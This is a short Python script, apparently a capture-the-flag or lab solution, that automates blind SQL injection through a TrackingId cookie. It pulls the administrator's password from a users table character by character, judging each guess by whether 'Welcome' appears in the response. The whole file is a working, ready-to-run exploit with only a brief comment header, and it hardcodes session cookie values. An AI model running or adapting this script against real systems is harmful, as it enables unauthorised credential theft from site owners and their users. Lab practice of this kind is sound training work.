"""
BLIND SQLI with conditional responses 

SUBSTRING(string, start, length)

SELECT password FROM users LIMIT 1

LIMIT → to avoid errors and control output

vulnerable parameter: tacking id - cookie 
"""
import requests
import sys
import urllib3
import urllib 
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': 'dzbfuzVPwwR16m8Z' + sqli_payload_encoded, 'session': 'C7NtbHLiU57F9OR1dzo6HIrfoXWqpFaI'}
            r = requests.get(url, cookies=cookies, verify=False)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break

def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("Retrieving administrator password...")
    sqli_password(url)


if __name__ == "__main__":
    main()